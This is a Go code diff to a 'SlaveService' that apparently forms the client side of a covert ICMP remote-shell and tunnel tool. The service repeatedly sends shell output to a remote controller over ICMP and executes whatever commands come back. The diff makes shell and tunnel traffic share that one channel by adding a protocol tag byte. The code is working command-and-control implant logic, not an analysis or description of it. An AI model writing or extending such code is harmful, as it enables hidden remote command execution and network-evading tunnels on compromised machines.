@@ -7,6 +7,7 @@ import (
 	"io"
 	"time"
 
+	"protocol/icmp/internal/protocol"
 	"protocol/icmp/internal/shell"
 	"protocol/icmp/internal/transport"
 	"protocol/icmp/internal/tunnel"
@@ -25,7 +26,6 @@ type SlaveService struct {
 	Executor shell.Executor
 
 	// Optional tunnel support
-	TunnelListener *transport.TunnelListener
 	TunnelManager  *tunnel.TunnelManager
 }
 
@@ -37,18 +37,6 @@ func (s SlaveService) Run(ctx context.Context) error {
 		return fmt.Errorf("poll client is required")
 	}
 
-	if s.TunnelListener != nil && s.TunnelManager != nil {
-		go func() {
-			s.log("Starting TunnelListener in background...\n")
-			err := s.TunnelListener.Listen(ctx, func(payload []byte) {
-				s.TunnelManager.HandlePacket(payload)
-			})
-			if err != nil {
-				s.log("TunnelListener exited: %v\n", err)
-			}
-		}()
-	}
-
 	for {
 		outBuf, err := s.Executor.ReadOutput(ctx)
 		if err != nil && err != io.EOF {
@@ -58,14 +46,34 @@ func (s SlaveService) Run(ctx context.Context) error {
 			s.log("%s\n", string(outBuf))
 		}
 
-		replyData, err := s.Client.Exchange(ctx, outBuf)
+		var payload []byte
+		if s.TunnelManager != nil {
+			if tunnelBuf := s.TunnelManager.TryDequeue(); tunnelBuf != nil {
+				payload = append([]byte{protocol.ProtocolTunnel}, tunnelBuf...)
+			}
+		}
+		if payload == nil {
+			payload = append([]byte{protocol.ProtocolShell}, outBuf...)
+		}
+
+		replyData, err := s.Client.Exchange(ctx, payload)
 		if err != nil {
 			s.log("sendICMP error: %v\n", err)
 		} else if len(replyData) > 0 {
-			s.log("%s\n", hex.Dump(replyData))
-			s.log("------ %s\n", string(replyData))
-			if err := s.Executor.Execute(replyData); err != nil {
-				return err
+			protoID := replyData[0]
+			data := replyData[1:]
+			if protoID == protocol.ProtocolTunnel {
+				if s.TunnelManager != nil {
+					s.TunnelManager.HandlePacket(data)
+				}
+			} else if protoID == protocol.ProtocolShell {
+				if len(data) > 0 {
+					s.log("%s\n", hex.Dump(data))
+					s.log("------ %s\n", string(data))
+					if err := s.Executor.Execute(data); err != nil {
+						return err
+					}
+				}
 			}
 		}
 
